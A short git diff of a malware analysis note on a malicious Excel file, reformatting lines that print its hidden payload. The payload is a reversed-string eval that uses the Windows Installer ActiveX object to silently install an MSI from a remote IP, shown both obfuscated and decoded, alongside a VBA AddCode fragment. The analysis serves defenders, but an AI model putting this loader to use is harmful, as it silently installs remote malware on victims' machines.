@@ -22,9 +22,8 @@ Contains an html attachment which contains a link to download a malicious XLS hx
         a.AddCode (ActiveWorkbook.BuiltinDocumentProperties("Comments").Value)
     End Function
     ```
-- Comments: eval('})"53.502.831.551//:ptth"(tcudorPllatsnI;2=leveLIU{))"rellatsnI.rellatsnIswodniW"(tcejbOXevitcA wen(htiw'.split('').reverse().join(''))
-- Reversed: with(new ActiveXObject("WindowsInstaller.Installer")){UILevel=2;InstallProduct("hxxp://155.138.205.35")}
-
+- Comments: ```eval('})"53.502.831.551//:ptth"(tcudorPllatsnI;2=leveLIU{))"rellatsnI.rellatsnIswodniW"(tcejbOXevitcA wen(htiw'.split('').reverse().join(''))```
+- Reversed: ```with(new ActiveXObject("WindowsInstaller.Installer")){UILevel=2;InstallProduct("hxxp://155.138.205.35")}```
 - Pulls down and executes MSI 
 
 # MSI (84ec41afdc49c2ee8dff9ba07ba5c9a4)
